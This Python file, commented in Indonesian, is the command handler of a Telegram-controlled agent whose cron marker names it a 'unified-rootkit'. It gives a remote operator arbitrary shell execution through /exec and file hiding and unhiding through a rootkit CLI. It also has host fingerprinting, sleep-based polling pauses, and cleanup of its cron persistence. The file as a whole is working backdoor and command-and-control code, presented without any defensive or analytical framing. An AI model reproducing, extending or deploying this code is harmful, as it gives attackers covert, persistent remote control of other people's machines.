#!/usr/bin/env python3
"""
commands.py — handler perintah untuk daemon Telegram.
Kontrak penuh: control/telegram/SPEC.md

Envelope balasan (SPEC §1):
    <emoji> <pesan singkat>
    <output, dipotong4000 char>
"""
import os
import platform
import subprocess
import time

TRUNC = 4000
EXEC_TIMEOUT = 10
MIN_EXEC_GAP = 2.0        # detik antar /exec
MAX_EXEC_PER_MIN = 10
UNINSTALL_MARKER = "# unified-rootkit"   # penanda baris cron milik kita


def _trunc(s):
    if len(s) <= TRUNC:
        return s
    return s[:TRUNC] + "\n… [+%d char lagi]" % (len(s) - TRUNC)


def _run(cmd, shell=False, timeout=EXEC_TIMEOUT):
    """Jalankan perintah → (rc, output_gabung)."""
    try:
        p = subprocess.run(cmd, shell=shell, capture_output=True,
                           timeout=timeout, text=True, errors="replace")
        out = (p.stdout or "") + (p.stderr or "")
        return p.returncode, out
    except subprocess.TimeoutExpired:
        return 124, "timeout setelah %d dtk" % timeout
    except Exception as e:
        return 1, "gagal: %s" % type(e).__name__


def _cli(ctx, *args):
    """Panggil binari CLI lokal (kontrak SPEC §3)."""
    cli = ctx.cfg.cli_path
    if not os.path.exists(cli):
        return 1, ("binari CLI belum ada — build dulu:\n"
                   "    make -C control/cli")
    return _run([cli] + list(args))


# ---------------- daftar perintah ----------------

def cmd_help(ctx, arg):
    return ("✅ perintah:\n"
            "/status — info host\n"
            "/exec <perintah> — jalankan shell (timeout10s)\n"
            "/hide <nama> — sembunyikan file\n"
            "/show <nama> — tampilkan file\n"
            "/sleep [detik] — jeda polling (default300)\n"
            "/uninstall — hentikan agent\n"
            "/help — bantuan")


def cmd_status(ctx, arg):
    try:
        with open("/proc/uptime") as f:
            up = float(f.read().split()[0])
        upt = "%dh%02dm" % (int(up // 3600), int(up % 3600) // 60)
    except Exception:
        upt = "?"
    return ("✅ host=%s\nkernel=%s\nuid=%d\nuptime=%s\nmode=%s"
            % (platform.node(), platform.release(), os.getuid(), upt,
               ctx.cfg.mode))


def cmd_exec(ctx, arg):
    if not arg:
        return "❌ perlu argumen: /exec <perintah>"
    now = time.time()
    # rate limit: jarak minimal + kuota per menit (SPEC §1)
    if now - ctx.last_exec < MIN_EXEC_GAP:
        return "⏳ tunggu %.0f dtk lagi" % (MIN_EXEC_GAP - (now - ctx.last_exec))
    ctx.exec_times = [t for t in ctx.exec_times if now - t < 60]
    if len(ctx.exec_times) >= MAX_EXEC_PER_MIN:
        return "⏳ batas %d/menit tercapai" % MAX_EXEC_PER_MIN
    ctx.last_exec = now
    ctx.exec_times.append(now)

    rc, out = _run(arg, shell=True)
    body = out if out.strip() else "(tidak ada output)"
    head = "✅ exit=0" if rc == 0 else "❌ exit=%d" % rc
    return head + "\n" + _trunc(body)


def cmd_hide(ctx, arg):
    if not arg:
        return "❌ perlu argumen: /hide <nama>"
    rc, out = _cli(ctx, "hide", "file", arg)
    if rc == 0:
        return "✅ %s disembunyikan" % arg
    return "❌ gagal: " + (out.strip() or str(rc))


def cmd_show(ctx, arg):
    if not arg:
        return "❌ perlu argumen: /show <nama>"
    rc, out = _cli(ctx, "unhide", "file", arg)
    if rc == 0:
        return "✅ %s ditampilkan" % arg
    return "❌ gagal: " + (out.strip() or str(rc))


def cmd_sleep(ctx, arg):
    try:
        detik = int(arg) if arg else 300
    except ValueError:
        return "❌ argumen harus angka detik"
    detik = max(10, min(detik, 86400))
    ctx.sleep_until = time.time() + detik
    return "✅ tidur %d dtk (polling dijeda)" % detik


def cmd_uninstall(ctx, arg):
    note = ""
    try:
        cur = subprocess.run(["crontab", "-l"], capture_output=True,
                             text=True, timeout=5).stdout
        lines = [l for l in cur.splitlines() if UNINSTALL_MARKER not in l]
        subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n",
                       text=True, timeout=5, capture_output=True)
        note = "\ncron baris agent dibersihkan"
    except Exception as e:
        note = "\n(catatan: bersihkan cron manual — %s)" % type(e).__name__
    ctx.should_exit = True
    return "✅ agent berhenti" + note


# ---------------- dispatcher ----------------

_ROUTES = {
    "help": cmd_help,
    "status": cmd_status,
    "exec": cmd_exec,
    "hide": cmd_hide,
    "show": cmd_show,
    "sleep": cmd_sleep,
    "uninstall": cmd_uninstall,
}


def dispatch(text, ctx):
    """'/cmd argumen...' → balasan. Otorisasi sudah dicek daemon SEBELUM ini."""
    body = text[1:].strip()
    if not body:
        return cmd_help(ctx, "")
    cmd, _, arg = body.partition(" ")
    cmd = cmd.lower()
    fn = _ROUTES.get(cmd)
    if fn is None:
        return "❌ perintah tak dikenal — /help untuk daftar"
    return fn(ctx, arg.strip())
